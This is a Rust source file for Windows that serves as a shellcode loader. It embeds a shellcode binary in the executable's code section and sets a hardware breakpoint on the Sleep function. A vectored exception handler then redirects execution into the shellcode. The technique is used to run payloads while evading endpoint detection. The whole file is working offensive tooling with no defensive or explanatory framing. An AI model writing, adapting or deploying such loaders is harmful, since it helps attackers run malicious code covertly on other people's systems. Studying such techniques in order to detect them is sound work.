use std::{mem::zeroed, os::raw::c_void, ptr::null_mut};

use windows_sys::Win32::{
    Foundation::EXCEPTION_SINGLE_STEP,
    System::{
        Diagnostics::Debug::{
            AddVectoredExceptionHandler, CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
            EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH, EXCEPTION_POINTERS,
            GetThreadContext, SetThreadContext,
        },
        LibraryLoader::{GetModuleHandleA, GetProcAddress},
        Threading::{GetCurrentThread, Sleep},
    },
};

const SHELLCODE_BYTES: &[u8] = include_bytes!("../shellcode.bin");
const SHELLCODE_SIZE: usize = SHELLCODE_BYTES.len();

#[unsafe(no_mangle)]
#[unsafe(link_section = ".text")]
static SHELLCODE: [u8; SHELLCODE_SIZE] = *include_bytes!("../shellcode.bin");

static mut SLEEP_FUNC_ADDR: *mut c_void = null_mut();

fn set_hwbp(thread_handle: *mut c_void, addr: *mut c_void, reg_index: u32) -> bool {
    unsafe {
        let mut context = zeroed::<CONTEXT>();
        context.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;

        if GetThreadContext(thread_handle, &mut context) == 0 {
            return false;
        }

        match reg_index {
            0 => context.Dr0 = addr as u64,
            1 => context.Dr1 = addr as u64,
            2 => context.Dr2 = addr as u64,
            3 => context.Dr3 = addr as u64,
            _ => return false,
        }

        let local_enable_bit = 1u64 << (reg_index * 2);
        context.Dr7 |= local_enable_bit; // Enable the breakpoint
        context.Dr7 &= !(0x3 << (16 + reg_index * 4)); // Clear the RW bits
        context.Dr7 &= !(0x3 << (18 + reg_index * 4)); // Clear the LEN bits

        if SetThreadContext(thread_handle, &mut context) == 0 {
            return false;
        }
    }

    true
}

fn rm_hwbp(thread_handle: *mut c_void, reg_index: u32) -> bool {
    unsafe {
        let mut context = zeroed::<CONTEXT>();
        context.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;

        if GetThreadContext(thread_handle, &mut context) == 0 {
            return false;
        }

        match reg_index {
            0 => context.Dr0 = 0,
            1 => context.Dr1 = 0,
            2 => context.Dr2 = 0,
            3 => context.Dr3 = 0,
            _ => return false,
        }

        context.Dr7 &= !(1 << (reg_index * 2)); // Disable the breakpoint

        if SetThreadContext(thread_handle, &mut context) == 0 {
            return false;
        }
    }

    true
}

unsafe extern "system" fn exception_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    unsafe {
        if (*(*exception_info).ExceptionRecord).ExceptionCode == EXCEPTION_SINGLE_STEP {
            if (*(*exception_info).ExceptionRecord).ExceptionAddress == SLEEP_FUNC_ADDR {
                println!("[+] Hardware breakpoint hit!");

                println!("RCX: {:x}", (*(*exception_info).ContextRecord).Rcx);
                println!("RDX: {:x}", (*(*exception_info).ContextRecord).Rdx);
                println!("R8: {:x}", (*(*exception_info).ContextRecord).R8);
                println!("R9: {:x}", (*(*exception_info).ContextRecord).R9);

                (*(*exception_info).ContextRecord).Rip = SHELLCODE.as_ptr() as u64;

                (*(*exception_info).ContextRecord).EFlags |= 0x10000;

                return EXCEPTION_CONTINUE_EXECUTION;
            }
            return EXCEPTION_CONTINUE_SEARCH;
        }

        return EXCEPTION_CONTINUE_SEARCH;
    }
}

fn main() {
    unsafe {
        let kernel32 = GetModuleHandleA("kernel32.dll\0".as_ptr() as *const u8);
        let sleep_addr = GetProcAddress(kernel32, "Sleep\0".as_ptr() as *const u8);

        SLEEP_FUNC_ADDR = sleep_addr.unwrap() as *mut c_void;

        set_hwbp(GetCurrentThread(), sleep_addr.unwrap() as _, 0);
        AddVectoredExceptionHandler(1, Some(exception_handler));

        Sleep(10);

        rm_hwbp(GetCurrentThread(), 0);
    }
}
